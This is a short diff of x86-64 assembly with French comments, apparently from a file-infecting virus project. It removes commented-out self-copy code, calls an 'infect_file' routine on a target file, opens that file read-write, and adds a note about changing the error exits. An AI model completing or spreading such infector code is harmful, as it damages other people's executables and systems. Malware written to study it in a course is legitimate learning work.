@@ -58,18 +58,6 @@ section .text
 global main
 extern printf
 
-
-;    mov rsi, [rsi+8]  first argument 
-;    mov rsi, PROG_SIZE     programe size
-;   lea rsi, [rel main]    pointeur sur le debut du programe
-
-
-;    mov rdi, 1
-;    lea rsi, [rel main]    écrit le programe
-;    mov rdx, PROG_SIZE
-;    mov rax, 1
-;    syscall
-
 main:
     push rbp
     mov rbp, rsp
@@ -78,8 +66,6 @@ main:
     push rcx
     push rdi
     push rsi
-
-;    mov rdi, [rsi+8]
     lea rdi, [rel ptest]
     mov rsi, rsp
     call infect_file
@@ -112,7 +98,7 @@ infect_file:
     mov rax, SYS_OPEN
     syscall              ; open(filemane, O_RDWR)
     cmp rax, 0           ; if (fd < 0) return ;
-    js exit
+    js exit              ;                                                  changer tous les jum exit pour juste quitter la fonction infect_file 
     mov [r12 + fd], rax
 get_file_data:
     mov rdi, [r12 + fd]
